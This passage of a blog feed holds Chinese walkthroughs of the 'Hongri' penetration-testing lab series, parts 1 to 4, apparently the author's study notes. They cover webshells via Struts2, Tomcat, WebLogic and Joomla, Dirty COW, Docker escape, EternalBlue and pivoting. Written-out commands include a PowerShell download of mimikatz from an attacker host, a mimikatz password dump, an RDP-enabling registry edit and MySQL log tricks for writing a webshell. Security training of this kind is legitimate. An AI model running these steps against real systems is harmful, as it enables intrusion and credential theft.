class="hljs-string">：phpmyadmin</span><br></code></pre></div></td></tr></table></figure><p>使用工具查看端口细节，2001端口struts2，直接漏洞利用</p><p>2002漏洞，tomacat，爆破</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130034549.png" alt="image-20240610130034549"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130043600.png" alt="image-20240610130043600"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130046803.png" alt="image-20240610130046803"></p><p>漏洞利用，直接getshell</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130159949.png" alt="image-20240610130159949"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130225005.png" alt="image-20240610130225005"></p><p>这个不是root权限，直接放弃，可能有目录读取</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130238977.png" alt="image-20240610130238977"></p><p>tomcat漏洞利用，put写入文件，直接写入jsp的shell</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130313075.png" alt="image-20240610130313075"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130317044.png" alt="image-20240610130317044"></p><p>写入shell，这里需要简单的绕过</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130323877.png" alt="image-20240610130323877"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130404448.png" alt="image-20240610130404448"></p><p>哥斯拉连接</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130348530.png" alt="image-20240610130348530"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130413481.png" alt="image-20240610130413481"></p><p>开启监听，反弹</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130427424.png" alt="image-20240610130427424"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130430351.png" alt="image-20240610130430351"></p><p>这是一个docker环境</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130439858.png" alt="image-20240610130439858"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130443393.png" alt="image-20240610130443393"></p><p>查看教程，逃逸</p><p><a href="http://www.zlprogram.com/Show/36/HYYX68M9.shtml">http://www.zlprogram.com/Show/36/HYYX68M9.shtml</a></p><p>这里将磁盘挂在到自己创建的文件里边，然后发现存在逃逸，写入ssh公钥</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130453272.png" alt="image-20240610130453272"></p><p>创建公钥私钥</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130459144.png" alt="image-20240610130459144"></p><p>然后将内容写入在家目录的.ssh中</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130506688.png" alt="image-20240610130506688"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130512662.png" alt="image-20240610130512662"></p><p>方法1，在kali创建公钥和私钥，然后传到靶机，使用 ssh -i[私钥] 参数连接</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130531270.png" alt="image-20240610130531270"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130534319.png" alt="image-20240610130534319"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130537785.png" alt="image-20240610130537785"></p><p>方法2，因为可以修改文件，所以说直接吧相同版本中的Ubuntu中新建的用户里边的password和shadow用户复制到etc的对应的文件中</p><p>方法3</p><p>Docker逃逸漏洞目前已知有</p><ul><li><p>Dirty     Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞</p></li><li><p>CVE-2019-5736</p></li><li><p>emote     api 未授权访问</p></li></ul><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130555458.png" alt="image-20240610130555458"></p><p>最后2个</p><p><a href="https://blog.csdn.net/qq_36197704/article/details/122109838">https://blog.csdn.net/qq_36197704/article/details/122109838</a></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130609331.png" alt="image-20240610130609331"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130615554.png" alt="image-20240610130615554"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130618409.png" alt="image-20240610130618409"></p><p>但是但是！！！</p><p>这里我复现3个，一个都没成功！！！</p><p>直接Ubuntu:ubuntu连接了。。。。。😭</p><h1 id="3、内网"><a href="#3、内网" class="headerlink" title="3、内网"></a>3、内网</h1><p>假装逃逸出来后，生一个马子</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130651507.png" alt="image-20240610130651507"></p><p>开启监听，马上传上去，运行，上线</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130658743.png" alt="image-20240610130658743"></p><p>发现内网网段</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130704855.png" alt="image-20240610130704855"></p><p>开启msf的自动路由功能</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130709653.png" alt="image-20240610130709653"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130715960.png" alt="image-20240610130715960"></p><p>上传fscan，使用fscan搜集内网网段的内容，2台存在永恒之蓝漏洞</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130729202.png" alt="image-20240610130729202"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130733976.png" alt="image-20240610130733976"></p><p>检测，发现漏洞存在</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130746921.png" alt="image-20240610130746921"></p><p>开启msf的socks代理，proxychains代理监听1080</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130753120.png" alt="image-20240610130753120"></p><p>这里一直失败，永恒之蓝两台机器，已经连过去了，但是一直连接失败，怀疑是代理问题，换个代理吧</p><p>Ew内网代理</p><p>kali</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130804867.png" alt="image-20240610130804867"></p><p>靶机</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130811562.png" alt="image-20240610130811562"></p><p>访问成功</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130818706.png" alt="image-20240610130818706"></p><p>但是使用msf框架利用永恒之蓝攻击失败，这里貌似运气成分把，需要多攻击几次，不过懒得弄了</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130845289.png" alt="image-20240610130845289"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130848069.png" alt="image-20240610130848069"></p><p>使用chisel</p><p>Ubuntu（出网靶机）是服务器</p><p>.&#x2F;chisel servers -p 8888 –socke5</p><p>kali是攻击机，也就是需要接受出网靶机的端口(10.87是出网靶机的IP)</p><p>.&#x2F;chisel client 192.168.10.87:8888 socks</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130858420.png" alt="image-20240610130858420"></p><p>kali</p><p>1080监听端口，然后nmap扫描，可以扫描</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130910718.png" alt="image-20240610130910718"></p><p>Msf，永恒之蓝Windows7，成功拿下</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130917611.png" alt="image-20240610130917611"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130923599.png" alt="image-20240610130923599"></p><p>Load_kiw查看账号密码，但是这里我想进shell一直进不去，timeout，估计又是隧道的问题，这里暂时没有想到解决办法，所以放弃。</p><p>一般关闭防火墙后打开3389或者使用psexec和wmiexec都可以连接，然后上传mimikatz查看管理员密码，在使用2个工具关闭防火墙就可以拿下域了吧。。。。</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130950869.png" alt="image-20240610130950869"></p><p>关关难，关关过，虽然失败了，但是也会学会了工具使用了</p>]]></content>
    
    
    <categories>
      
      <category>红日靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日靶场（3）</title>
    <link href="/2024/06/10/%E7%BA%A2%E6%97%A53/"/>
    <url>/2024/06/10/%E7%BA%A2%E6%97%A53/</url>
    
    <content type="html"><![CDATA[<h1 id="1、环境配置"><a href="#1、环境配置" class="headerlink" title="1、环境配置"></a>1、环境配置</h1><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610123836301.png" alt="image-20240610123836301"></p><p>外网我是使用桥接模式，因为两台电脑，方便连接</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610123845159.png" alt="image-20240610123845159"></p><h1 id="2、web打点"><a href="#2、web打点" class="headerlink" title="2、web打点"></a>2、web打点</h1><p>端口扫描，存在3个开放端口，访问80</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610123922048.png" alt="image-20240610123922048"></p><p>顺便使用nmap扫一扫漏洞，发现是joomla的框架</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610123929138.png" alt="image-20240610123929138"></p><p>扫描路径，存在配置文件泄漏</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610123939201.png" alt="image-20240610123939201"></p><p>连接数据库</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610123947371.png" alt="image-20240610123947371"></p><p>查看数据库内容，这里使用joomla常见利用，手动添加一个管理员进去，然后登录后台即可</p><p>参考！<a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn">https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn</a></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124109963.png" alt="image-20240610124109963"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124128124.png" alt="image-20240610124128124"></p><p>添加admin&#x2F;secret的管理员</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124133828.png" alt="image-20240610124133828"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124206510.png" alt="image-20240610124206510"></p><p>登录后台后，在templates中可以添加模板，创建shell.php</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124213951.png" alt="image-20240610124213951"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124227590.png" alt="image-20240610124227590"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124239424.png" alt="image-20240610124239424"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124245959.png" alt="image-20240610124245959"></p><p>成功</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124253288.png" alt="image-20240610124253288"></p><p>蚁剑访问，但是执行命令的时候，存在报错</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124305955.png" alt="image-20240610124305955"></p><p>直接使用蚁剑自带的绕过，绕过后执行命令，成功执行</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124312623.png" alt="image-20240610124312623"></p><p>这里需要信息收集，在 tmp&#x2F;mysql中存在账号密码，使用ssh连接</p><p>开始提权</p><p>提权：使用脚本<a href="https://github.com/The-Z-Labs/linux-exploit-suggester">https://github.com/The-Z-Labs/linux-exploit-suggester</a></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124347999.png" alt="image-20240610124347999"></p><p>脏牛提权</p><p><a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p><p>这里使用poc创建了一个用户 firefart:password</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124358165.png" alt="image-20240610124358165"></p><h1 id="3、内网探测"><a href="#3、内网探测" class="headerlink" title="3、内网探测"></a>3、内网探测</h1><p>msf生成一个马</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124513971.png" alt="image-20240610124513971"></p><p>传到靶机上，给予权限，然后上线</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124521472.png" alt="image-20240610124521472"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124528827.png" alt="image-20240610124528827"></p><p>开启自动路由，反向代理出来</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124537434.png" alt="image-20240610124537434"></p><p>将已知的靶场ip都检测一下，<strong>445端口</strong>，可以尝试爆破，这里先测试一下代理是否成功</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124546196.png" alt="image-20240610124546196"></p><p>使用隧道，转发出来，然后curl测试内网站点是否能访问</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124554605.png" alt="image-20240610124554605"></p><p>开始爆破，设置字典，这里方便测试，将域密码也放入测试，爆破成功</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124848413.png" alt="image-20240610124848413"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124859257.png" alt="image-20240610124859257"></p><h2 id="wmiexec-smb-利用"><a href="#wmiexec-smb-利用" class="headerlink" title="wmiexec smb****利用"></a><strong>wmiexec smb****利用</strong></h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">WMI介绍：<br>WMI（Windows Management Instrumentation,Windows 管理规范）是一项核心的 Windows 管理技术；用户可以使用 WMI 管理本地和远程计算机。     <br><br>作用：WMI以CIMOM为基础，CIMOM即公共信息模型对象管理器（Common Information Model Object Manager），是一个描述操作系统构成单元的对象数据库，为MMC和脚本程序提供了一个访问操作系统构成单元的公共接口。有了WMI，工具软件和脚本程序访问操作系统的不同部分时不需要使用不同的API；相反，操作系统的不同部分都可以插入WMI，工具软件和脚本程序可以方便地读写WMI。<br><br> WMI 可以管理本地和远程计算机，攻击者使用 wmi 攻击时 windows 系统默认不会在日志中记录这些操作，可以做到无日志、攻击脚本无需写入到磁盘，增加了隐蔽性。<br> <br> wmiexec下载地址：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/CoreSecurity/im</span>packet<span class="hljs-regexp">/blob/m</span>aster<span class="hljs-regexp">/examples/</span>wmiexec.py<br></code></pre></div></td></tr></table></figure><p>连接个个内网</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610125011175.png" alt="image-20240610125011175"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610125014139.png" alt="image-20240610125014139"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610125017213.png" alt="image-20240610125017213"></p><p>全部成功，但是域不知道账号密码，使用一台内网主机，代理出来后使用rdesktop连接 </p><p>Administrator:123qwe!ASD</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610125032909.png" alt="image-20240610125032909"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610125043986.png" alt="image-20240610125043986"></p><p>上传Mimikatz在其中一台开放web访问的机子中，然后让这台机子直接访问网址下载</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610125100172.png" alt="image-20240610125100172"></p><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</p><p>powershell (new-object Net.WebClient).DownloadFile(‘<a href="http://192.168.93.100:8888/kiwikatz.exe','C:/mimikatz.exe">http://192.168.93.100:8888/kiwikatz.exe&#39;,&#39;C:\mimikatz.exe</a>‘)</p><p>mimikatz.exe “privilege::debug” “log” “sekurlsa::logonpasswords” “exit” &gt; log.log</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610125423289.png" alt="image-20240610125423289"></p><p>读取密码</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610125434209.png" alt="image-20240610125434209"></p><p>wmiexec连接，成功</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610125441128.png" alt="image-20240610125441128"></p><p>拿下域服务器</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610125447765.png" alt="image-20240610125447765"></p>]]></content>
    
    
    <categories>
      
      <category>红日靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日靶场（2）</title>
    <link href="/2024/06/10/%E7%BA%A2%E6%97%A52/"/>
    <url>/2024/06/10/%E7%BA%A2%E6%97%A52/</url>
    
    <content type="html"><![CDATA[<h1 id="1、环境配置"><a href="#1、环境配置" class="headerlink" title="1、环境配置"></a>1、环境配置</h1><p>配置IP，自己任意配置，然后web和PC存在外网ip和内网ip，也就是需要2张网卡，DC域存在内网，无外网</p><p>以下图片仅供参考</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610122919628.png" alt="image-20240610122919628"></p><p>密码为 1qaz@WSX</p><p>需要开启</p><p>C:\Oracle\Middleware\user_projects\domains\base_domain\bin\strartWebLogic.cmd</p><h1 id="2、外网打点"><a href="#2、外网打点" class="headerlink" title="2、外网打点"></a>2、外网打点</h1><p>已知一台的ip为 <em>192.168.10.75 为web服务器</em> 另一台为 <em>192.168.10.74 为办公员工区</em></p><p>nmap扫描,<strong>.75ip扫描结果，存在永恒之蓝</strong></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123039595.png" alt="image-20240610123039595"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123051754.png" alt="image-20240610123051754"></p><p>二次确认，.74扫描结果，使用–script&#x3D;vuln 扫描到永恒之蓝</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123137591.png" alt="image-20240610123137591"></p><p>使用dirsearch查询路径，发现login，通过页面webloginc，利用漏洞工具查询</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123148908.png" alt="image-20240610123148908"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123211436.png" alt="image-20240610123211436"></p><p>验证漏洞，存在漏洞，上传一句话木马，然后哥斯拉上线</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123219856.png" alt="image-20240610123219856"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123303872.png" alt="image-20240610123303872"></p><p>连接成功</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123313051.png" alt="image-20240610123313051"></p><p>查看目录结构</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123321691.png" alt="image-20240610123321691"></p><p>因为这里默认存在360，需要免杀绕过，免杀只会用别人现成的工具，自己并不会免杀😭，所以手动关闭</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123409748.png" alt="image-20240610123409748"></p><p>使用提权一通乱提，system权限</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123417856.png" alt="image-20240610123417856"></p><p>至此，外网服务器已经拿下，接下来是内网</p><h1 id="3、内网"><a href="#3、内网" class="headerlink" title="3、内网"></a>3、内网</h1><p>先让CS和msf关联起来</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm"><span class="hljs-built_in">CS</span>创建一个foreign监听，<span class="hljs-built_in">ip</span>和端口需要和msf的一致<br><br>然后msf 使用 exploit/multi/handler payload： windows/mterpreter/revers_http<br><br>然后设置<span class="hljs-built_in">IP</span>和port，需要和<span class="hljs-built_in">CS</span>的一致<br><br>在使用spwan监听到<span class="hljs-built_in">CS</span>的foreign，然后查看msf的上线情况<br></code></pre></div></td></tr></table></figure><p>msf的路由模式，访问内网不出网内容，在session中使用自动路由</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123553893.png" alt="image-20240610123553893"></p><p>使用msf查看网段，使用arp_scanner模块，设置网段，设置session，然后run，这里和cs的portscan功能差不多10.10.10.0&#x2F;24</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123559837.png" alt="image-20240610123559837"></p><p>查看是否存在永恒之蓝漏洞</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123620870.png" alt="image-20240610123620870"></p><p>MSF上线CS</p><p>cs创建一个监听，端口为80</p><p>然后msf使用payload注入模块，然后设置payload，为reverse_http，设置session，要上线的session，这里只能上线出网的内容</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123631562.png" alt="image-20240610123631562"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123636701.png" alt="image-20240610123636701"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123642033.png" alt="image-20240610123642033"></p><p>回到msf，因为路由了，所以说直接使用永恒之蓝 windows&#x2F;smb&#x2F;ms17_010_psexec 设置 payload windows&#x2F;meterpreter&#x2F;bind_tcp，然后run就行，上线域控制器，拿下内网</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123650423.png" alt="image-20240610123650423"></p><p>.&#x2F;de1ay:1qaz@WSX 使用rdesktop连接就行了</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123707655.png" alt="image-20240610123707655"></p>]]></content>
    
    
    <categories>
      
      <category>红日靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日靶场（1）</title>
    <link href="/2024/06/10/%E7%BA%A2%E6%97%A51/"/>
    <url>/2024/06/10/%E7%BA%A2%E6%97%A51/</url>
    
    <content type="html"><![CDATA[<h1 id="1、环境配置"><a href="#1、环境配置" class="headerlink" title="1、环境配置"></a>1、环境配置</h1><p>红日靶场中存在一台Windows7，一台Windows server 2003 和一台Windows server 2008</p><p>其中Windows7部署两张网卡 一张仅主机模式，用于内网， 一张看情况，用于外网，这里我是桥接模式</p><p>两台Windows server 是仅主机模式，存在于内网环境中。</p><p>部署完毕后重启</p><p><strong>phpstudy，启动</strong></p><p>开始打靶</p><h1 id="2、web打点"><a href="#2、web打点" class="headerlink" title="2、web打点"></a>2、web打点</h1><p>通过信息收集，发现探针</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610112901058.png" alt="01"></p><p>然后尝试弱口令 root&#x2F;root 测试成功</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610112917532.png" alt="image-20240610112917532"></p><p>扫描目录，发现phpMyAdmin，使用root&#x2F;root登录</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610112944031.png" alt="image-20240610112944031"></p><p>登录成功，这里可以想到使用phpMyAdmin来getshell</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113012092.png" alt="image-20240610113012092"></p><p>通过phpinfo报错页面查看到绝对路径，然后使用数据库写入shell，这里有多重方法，这里选择使用日志写入</p><p>&#96;Show variables like ‘%general%’; 查看功能是否开启</p><p>Set global general_log &#x3D; on; 开启日志功能</p><p>Set global general_log_file &#x3D; “c:\phpstuty\www\1.php”; 设置日志输出位置，前提是知道绝对路径&#96;</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113136786.png" alt="image-20240610113136786"></p><p>测试PHPinfo，写入成功</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113145213.png" alt="image-20240610113145213"></p><h1 id="3、初探"><a href="#3、初探" class="headerlink" title="3、初探"></a>3、初探</h1><p>连接蚁剑，权限为administrator</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113229156.png" alt="image-20240610113229156"></p><p>查看防火墙状态，发现打开，然后关闭</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113253799.png" alt="image-20240610113253799"></p><p>生成一个木马，然后传到蚁剑，打开运行，msf上线，方便后续操作</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113301879.png" alt="image-20240610113301879"></p><h1 id="4、深入"><a href="#4、深入" class="headerlink" title="4、深入"></a>4、深入</h1><p>使用msf查看域信息<img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113403698.png" alt="image-20240610113403698"><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113442886.png" alt="image-20240610113442886"></p><p>利用msf打开远程rdp，使用kali的redesktop ip:3389连接，这里连接成功了，没截图</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113412110.png" alt="image-20240610113412110"></p><p>查看arp信息，动态和静态，52网段<img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113454890.png" alt="image-20240610113454890"></p><p>查看域内用户</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113504648.png" alt="image-20240610113504648"></p><p>有内网，直接上cs了</p><p>CS4.0，上传木马，然后传到Windows7后打开上线</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113531629.png" alt="image-20240610113531629"></p><p>查看域以及对应的ip地址</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113540705.png" alt="image-20240610113540705"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113549428.png" alt="image-20240610113549428"></p><p>使用cs自带的cs提权，直接提取至system权限</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113611647.png" alt="image-20240610113611647"></p><h2 id="与msf关联"><a href="#与msf关联" class="headerlink" title="与msf关联"></a>与msf关联</h2><p>创建forset_http监听，然后然后msf监听对应ip以及端口</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113638905.png" alt="image-20240610113638905"></p><p>使用msf自带的smb扫描工具，然后查询445端口</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113647069.png" alt="image-20240610113647069"></p><p>使用msf模块查看系统中安装了哪些应用，这里顺带一提，实战中估计可以利用一些软件漏洞提权或者其他操作</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113656625.png" alt="image-20240610113656625"></p><h2 id="sockers-反向代理"><a href="#sockers-反向代理" class="headerlink" title="sockers 反向代理"></a>sockers 反向代理</h2><p>使用cs创建隧道，中转-&gt;socker server 然后配置proxychains </p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113819088.png" alt="image-20240610113819088"></p><p>然后使用proxychains firefox 打开火狐 访问 192.168.52.138</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113826214.png" alt="image-20240610113826214"></p><p>成功出网，但是无法将端口转发到metpreter，更换个代理工具，用lcx，然后配置proxychnains firefox 打开192.168.52.138，正常</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113903165.png" alt="image-20240610113903165"></p><p>回到msf</p><p>load kiwi 加载kiwi，</p><p>creds_all 显示明文密码</p><p>creds_kerberos 显示所有</p><p>这里内网横向使用CS自带的工具，创建一个smb监听器，然后使用jump-psexce，使用使用hashdump出来的管理员明文登录</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113925837.png" alt="image-20240610113925837"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113940093.png" alt="image-20240610113940093"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113954217.png" alt="image-20240610113954217"></p><h6 id="博客目的是为了将我的onenot中之前的学习笔记备份至github中，所以内容所显潦草🫡"><a href="#博客目的是为了将我的onenot中之前的学习笔记备份至github中，所以内容所显潦草🫡" class="headerlink" title="博客目的是为了将我的onenot中之前的学习笔记备份至github中，所以内容所显潦草🫡"></a>博客目的是为了将我的onenot中之前的学习笔记备份至github中，所以内容所显潦草🫡</h6>]]></content>
    
    
    <categories>
      
      <category>红日靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>about_me</title>
    <link href="/2002/10/18/1/"/>
    <url>/2002/10/18/1/</url>
    
    <content type="html"><![CDATA[<p><img src="/2002/10/18/1/111.jpg" alt="cat"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
